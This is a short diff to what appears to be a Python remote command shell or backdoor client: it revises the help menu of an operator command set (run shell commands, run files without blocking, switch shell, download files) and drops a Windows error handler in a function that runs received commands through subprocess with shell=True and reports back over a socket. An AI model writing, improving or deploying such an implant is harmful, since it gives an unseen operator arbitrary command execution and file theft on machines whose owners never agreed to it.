@@ -42,8 +42,8 @@ help_menu = '''\nCommand Shell Menu
 
    Command Shell Commands :
       exec <shell command>              Executes shell command and returns output
-      exec_file <file/executable>       Executes a shell command with no output
-      swap <shell>                      Switch the type of shell used, default is "/bin/bash"
+      exec_file <shell command>         Executes a shell command with no output(use this to run files and avoid blocking)
+      swap <shell path>                 Switch the type of shell used, default is "/bin/bash"
 
    File Commands :
       download <filepath>               Download file
@@ -101,8 +101,6 @@ def file_execute(command):
         result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
         s.sendall('[+]Executed : ' + command + End)
-    except WindowsError:
-        s.sendall('[-]Excutable/file, "' + command + '" does not exist' + End)
     except Exception as e:
         s.sendall('[-]Error executing, "' + command + '" : ' + str(e) + End)
 
